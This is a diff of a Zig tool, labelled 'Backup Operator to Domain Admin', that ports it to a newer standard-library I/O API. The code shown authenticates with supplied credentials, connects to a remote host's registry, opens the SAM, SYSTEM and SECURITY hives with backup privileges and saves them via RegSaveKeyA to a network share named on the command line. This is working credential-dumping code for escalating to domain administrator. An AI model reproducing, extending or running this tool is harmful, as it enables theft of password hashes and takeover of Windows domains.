@@ -14,31 +14,32 @@ const kernel32 = windows.kernel32;
 const REG_OPTION_BACKUP_RESTORE = 0x00000004;
 const REG_OPTION_OPEN_LINK = 0x00000008;
 
-extern "kernel32" fn GetLastError() callconv(windows.WINAPI) windows.DWORD;
+extern "kernel32" fn GetLastError() callconv(.winapi) windows.DWORD;
 
 // This exists until zigwin32 is updated to enable bitmasks for DesiredAccess /-:
 extern "advapi32" fn OpenProcessToken(
     ProcessHandle: ?win32.HANDLE,
     DesiredAccess: u32,
     TokenHandle: ?*?win32.HANDLE,
-) callconv(windows.WINAPI) win32.BOOL;
+) callconv(.winapi) win32.BOOL;
 
-fn getUserChoice(absolute_path: []const u8) bool {
-    const stdout = std.io.getStdOut().writer();
-    stdout.print("\nFile ({s}) already exists - remove? (y/N): ", .{absolute_path}) catch undefined;
+fn getUserChoice(allocator: std.mem.Allocator, io: std.Io, absolute_path: []const u8) bool {
+    const buffer: []u8 = std.fmt.allocPrint(allocator, "\nFile ({s}) already exists - remove? (y/N): \x00", .{absolute_path}) catch undefined;
+
+    std.Io.File.stdout().writeStreamingAll(io, buffer) catch undefined;
 
     var input: [8]u8 = undefined;
-    _ = std.io.getStdIn().read(&input) catch undefined;
+    _ = std.Io.File.stdin().readPositionalAll(io, &input, 0) catch undefined;
 
     return std.mem.eql(u8, input[0..1], "y");
 }
 
-pub fn fileExists(absolute_path: []const u8) bool {
-    var file = std.fs.openFileAbsolute(absolute_path, .{}) catch |err| {
+pub fn fileExists(io: std.Io, absolute_path: []const u8) bool {
+    var file = std.Io.Dir.openFileAbsolute(io, absolute_path, .{}) catch |err| {
         if (err == error.FileNotFound) return false;
         return false;
     };
-    defer file.close();
+    defer file.close(io);
 
     return true;
 }
@@ -46,6 +47,7 @@ pub fn fileExists(absolute_path: []const u8) bool {
 const Target = struct {
     const Self = @This();
 
+    io: std.Io,
     force: bool,
     domain: []u8,
     username: []u8,
@@ -55,8 +57,9 @@ const Target = struct {
     token: ?win32.HANDLE,
     allocator: std.mem.Allocator,
 
-    pub fn init(allocator: std.mem.Allocator) !Self {
+    pub fn init(io: std.Io, allocator: std.mem.Allocator) !Self {
         return Self{
+            .io = io,
             .force = false,
             .domain = "",
             .username = "",
@@ -70,9 +73,9 @@ const Target = struct {
 
     pub fn authenticate(self: *Self) bool {
         // b/c zig is different and we need a cstr (null terminated)
-        const domain = std.fmt.allocPrintZ(self.allocator, "{s}", .{self.domain}) catch undefined;
-        const username = std.fmt.allocPrintZ(self.allocator, "{s}", .{self.username}) catch undefined;
-        const password = std.fmt.allocPrintZ(self.allocator, "{s}", .{self.password}) catch undefined;
+        const domain = std.fmt.allocPrintSentinel(self.allocator, "{s}", .{self.domain}, 0) catch undefined;
+        const username = std.fmt.allocPrintSentinel(self.allocator, "{s}", .{self.username}, 0) catch undefined;
+        const password = std.fmt.allocPrintSentinel(self.allocator, "{s}", .{self.password}, 0) catch undefined;
 
         defer self.allocator.free(domain);
         defer self.allocator.free(username);
@@ -188,7 +191,12 @@ const Target = struct {
 
         const hives = [_][]const u8{ "SAM", "SYSTEM", "SECURITY" };
 
-        const source = std.fmt.allocPrintZ(self.allocator, "\\\\{s}", .{self.source.?}) catch return false;
+        const source = std.fmt.allocPrintSentinel(
+            self.allocator,
+            "\\\\{s}",
+            .{self.source.?},
+            0,
+        ) catch return false;
         defer self.allocator.free(source);
 
         // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regconnectregistrya
@@ -210,7 +218,7 @@ const Target = struct {
         for (hives) |h| {
             std.log.info("[+] Saving {s} hive to {s}\\{s}", .{ h, self.destination, h });
 
-            const hive = std.fmt.allocPrintZ(self.allocator, "{s}", .{h}) catch undefined;
+            const hive = std.fmt.allocPrintSentinel(self.allocator, "{s}", .{h}, 0) catch undefined;
             defer self.allocator.free(hive);
 
             std.log.debug("[+] Calling RegOpenKeyExA(HKLM, {s}, REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, hKey)", .{hive});
@@ -237,12 +245,12 @@ const Target = struct {
                 break;
             }
 
-            const destination = std.fmt.allocPrintZ(self.allocator, "{s}\\{s}", .{ self.destination, hive }) catch undefined;
+            const destination = std.fmt.allocPrintSentinel(self.allocator, "{s}\\{s}", .{ self.destination, hive }, 0) catch undefined;
             defer self.allocator.free(destination);
 
-            if (fileExists(destination)) {
-                if (self.force or getUserChoice(destination)) {
-                    std.fs.deleteFileAbsolute(destination) catch {
+            if (fileExists(self.io, destination)) {
+                if (self.force or getUserChoice(self.allocator, self.io, destination)) {
+                    std.Io.Dir.deleteFileAbsolute(self.io, destination) catch {
                         std.log.err("Failed to delete: {s}\n", .{destination});
                         ret = false;
                     };
@@ -266,7 +274,7 @@ const Target = struct {
                         std.log.err("[!] Failed RegSaveKeyA - Cannot create a new file when that file already exists :: error code ({d})", .{@intFromEnum(result)});
                     } else if (result == win32.WIN32_ERROR.ERROR_ACCESS_DENIED) {
                         std.log.err("[!] Failed RegSaveKeyA - access denied :: error code ({d})", .{@intFromEnum(result)});
-                        std.fs.deleteFileAbsolute(destination) catch undefined;
+                        std.Io.Dir.deleteFileAbsolute(self.io, destination) catch undefined;
                     } else {
                         std.log.err("[!] Failed RegSaveKeyA :: error code ({d})", .{@intFromEnum(result)});
                     }
@@ -307,7 +315,7 @@ const Target = struct {
         );
     }
 
-    pub fn parseTarget(self: *Self, line: []u8) !void {
+    pub fn parseTarget(self: *Self, line: [:0]const u8) !void {
         const hasDomain = std.mem.containsAtLeast(u8, line, 1, "/");
         const hasPassword = std.mem.containsAtLeast(u8, line, 1, ":");
         const hasTarget = std.mem.containsAtLeast(u8, line, 1, "@");
@@ -377,7 +385,7 @@ const Target = struct {
         }
     }
 
-    pub fn parseShare(self: *Self, line: []u8) !void {
+    pub fn parseShare(self: *Self, line: [:0]const u8) !void {
         self.destination = try self.allocator.alloc(u8, line.len);
 
         if (line.len > 0) {
@@ -385,7 +393,7 @@ const Target = struct {
         }
     }
 
-    pub fn parseForce(self: *Self, line: []u8) !void {
+    pub fn parseForce(self: *Self, line: [:0]const u8) !void {
         self.force = std.mem.containsAtLeast(u8, line, 1, "f") or std.mem.containsAtLeast(u8, line, 1, "F");
     }
 
@@ -410,10 +418,8 @@ const Target = struct {
     }
 };
 
-pub fn usage(argv: []u8) !void {
-    const stdout = std.io.getStdOut().writer();
-
-    try stdout.print(
+pub fn usage(argv: [:0]const u8) !void {
+    std.debug.print(
         \\Backup Operator to Domain Admin (by @ArchiMoebius)
         \\
         \\  This tool exist thanks to https://github.com/Wh04m1001 && https://github.com/mpgn
@@ -425,23 +431,22 @@ pub fn usage(argv: []u8) !void {
         \\ .\\{s} domain/username:password@ip fqdn\\share F
     , .{argv});
 
-    std.posix.exit(0);
+    std.process.exit(0);
 }
 
-pub fn main() !void {
-    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
+pub fn main(init: std.process.Init) !void {
+    var gpa = std.heap.DebugAllocator(.{}){};
     const allocator = gpa.allocator();
     defer _ = gpa.deinit();
 
-    // Parse args into string array (error union needs 'try')
-    const args = try std.process.argsAlloc(allocator);
-    defer std.process.argsFree(allocator, args);
+    // Read Argv for file path
+    const args = try init.minimal.args.toSlice(init.arena.allocator());
 
     if (args.len != 3 and args.len != 4) {
         try usage(args[0]);
     }
 
-    var target = try Target.init(allocator);
+    var target = try Target.init(init.io, allocator);
     defer target.deinit();
 
     var i: u8 = 0;
@@ -487,5 +492,5 @@ pub fn main() !void {
 
     std.log.info("[+] Exported!", .{});
 
-    std.posix.exit(0);
+    std.process.exit(0);
 }
